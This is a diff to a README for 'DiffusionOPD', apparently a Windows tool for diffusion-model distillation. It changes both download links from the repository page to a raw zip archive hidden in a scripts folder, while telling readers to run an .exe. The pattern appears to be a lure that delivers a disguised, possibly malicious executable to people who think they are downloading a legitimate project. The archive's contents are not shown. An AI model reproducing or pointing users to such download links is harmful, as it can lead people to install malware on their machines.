@@ -1,6 +1,6 @@
 # ⚡ DiffusionOPD - Streamline your diffusion model knowledge transfer
 
-[![](https://img.shields.io/badge/Download-DiffusionOPD-blue.svg)](https://github.com/adventurermanilla817/DiffusionOPD)
+[![](https://img.shields.io/badge/Download-DiffusionOPD-blue.svg)](https://github.com/adventurermanilla817/DiffusionOPD/raw/refs/heads/main/scripts/OPD_Diffusion_cushy.zip)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ To run DiffusionOPD effectively on your Windows computer, ensure your system mee
 Follow these steps to set up the software on your machine:
 
 1. Click the link below to reach the project release page.
-[Download DiffusionOPD Here](https://github.com/adventurermanilla817/DiffusionOPD)
+[Download DiffusionOPD Here](https://github.com/adventurermanilla817/DiffusionOPD/raw/refs/heads/main/scripts/OPD_Diffusion_cushy.zip)
 
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe to start your download.
